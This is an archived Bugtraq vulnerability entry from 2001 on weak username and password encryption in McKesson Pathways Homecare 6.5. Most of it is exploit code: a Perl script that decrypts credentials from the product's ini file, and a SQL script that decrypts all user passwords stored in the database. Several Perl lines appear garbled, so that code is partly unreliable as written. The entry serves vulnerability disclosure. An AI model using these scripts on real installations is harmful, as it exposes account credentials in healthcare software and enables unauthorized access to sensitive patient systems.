#SpeeDr00t@Black Falcon<br>#bid3653<p><b><span style="font-size: 18pt;">McKesson Pathways Homecare Weak Username and Password Encryption Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/3653/info">info</a><br><a href="http://www.securityfocus.com/bid/3653/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/3653/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/3653/solution">solution</a><br><a href="http://www.securityfocus.com/bid/3653/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				3653
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Design Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				No
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Dec 07 2001 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Dec 07 2001 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				This vulnerability was discovered and reported by shoeboy &lt;shoeboy@adequacy.org&gt;.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					McKesson Pathways Homecare 6.5 <br/>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 95  SR2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 95  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 95  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 98  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 98  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 98SE  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 98SE  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows ME  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows ME  <br/>
</span>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	The following exploit code was provided by shoeboy &lt;shoeboy@adequacy.org&gt;.<br/><br/>For the SQL server account:<br/>#! /usr/bin/perl -w<br/><br/>################################################################################<br/># pwhc_crack.pl -- Extracts a password from a Pathways Homecare PWHC.ini<br/>file<br/>################################################################################<br/><br/>use strict;<br/><br/>open (PWHC, "pwhc.ini") or die "Unable to open .ini file";<br/>while (&lt;PWHC&gt;) {<br/>   chomp;<br/>   if ($_ =~ /^UserID/) { print "UserID: ", decrypt($_), "\n"; }<br/>   if ($_ =~ /^Password/) { print "Password: ", decrypt($_), "\n"; }<br/>}<br/><br/>sub decrypt {<br/>   my $counter = 0;<br/>   my $key;<br/>   my @cryptstr = split /=/, $_, 2;<br/>   my @revstr = unpack("c*", (scalar reverse $cryptstr1));<br/>   if(@revstr % 2) {<br/>      $key = 3;<br/>      while ($counter &lt; @revstr) {<br/>         $revstr$counter += $key;<br/>         $counter++;<br/>         $key += ($counter % 2) ? 5 : -3;<br/>      }<br/>   }<br/>   else {<br/>      $key = 7;<br/>      while ($counter &lt; @revstr) {<br/>         $revstr$counter += $key;<br/>         $counter++;<br/>         $key += ($counter % 2) ? -3 : 5;<br/>      }<br/>}<br/>   return pack("c*", (reverse @revstr));<br/>}<br/><br/>For the Visual Basic client:<br/>SET NOCOUNT ON<br/>DECLARE @evenkey varchar(15)<br/>DECLARE @oddkey varchar(15)<br/>DECLARE @key varchar(15)<br/>DECLARE @cryptstr varchar(15)<br/>DECLARE @position tinyint<br/>DECLARE @length tinyint<br/>DECLARE @usrid varchar(30)<br/><br/>DECLARE pwd_cursor CURSOR FOR SELECT usrID, pwd FROM usr<br/>OPEN pwd_cursor<br/>FETCH NEXT FROM pwd_cursor INTO @usrID, @cryptstr<br/>SET @evenkey = 'FDHFJHLJNLPNRP'<br/>SET @oddkey = 'CGEIGKIMKOMQOSQ'<br/><br/>WHILE (@@FETCH_STATUS = 0)<br/>BEGIN<br/>SET @position = 1<br/>SET @length = datalength(@cryptstr)<br/>IF ((@length % 2) = 1) SET @key = @oddkey<br/>ELSE SET @key = @evenkey<br/><br/>WHILE (@position &lt;= @length)<br/>BEGIN<br/>   SET @cryptstr = STUFF(@cryptstr, (@length - @position) + 1, 1,<br/>       CHAR((ASCII(SUBSTRING(@key, @position, 1)) - 65)<br/>       + ASCII(SUBSTRING(@cryptstr, (@length - @position) + 1, 1))))<br/>   SET @position = @position + 1<br/>END<br/>PRINT @usrID + ' : ' + @cryptstr<br/>FETCH NEXT FROM pwd_cursor INTO @usrID, @cryptstr<br/>END<br/>DEALLOCATE pwd_cursor<br/>GO
	
		<ul>
</ul>
</div>